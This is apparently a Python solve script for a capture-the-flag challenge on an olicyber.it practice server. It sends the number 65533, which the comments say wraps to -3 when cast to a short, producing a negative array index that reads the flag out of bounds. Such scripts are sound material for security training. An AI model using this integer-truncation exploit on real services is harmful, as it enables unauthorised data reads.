import socket

HOST = 'intagram.challs.olicyber.it'
PORT = 10101

def solve():
    print(f"Connecting to {HOST}:{PORT}...")
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.connect((HOST, PORT))
            
            # Read initial output until prompt
            while True:
                data = s.recv(1024).decode()
                print(data, end='')
                if ">" in data:
                    break
            
            # Send the exploit value
            # 65533 becomes -3 when cast to short
            # index = -3 - 1 = -4
            # frasi[-4] points to system_strings[2] which contains the flag
            print("\n[+] Sending payload: 65533")
            s.sendall(b"65533\n")
            
            # Read the flag
            while True:
                data = s.recv(1024).decode()
                print(data, end='')
                if "Ne desideri altre?" in data:
                    break
            
            s.sendall(b"n\n")
            
    except Exception as e:
        print(f"\n[-] Error: {e}")

if __name__ == "__main__":
    solve()
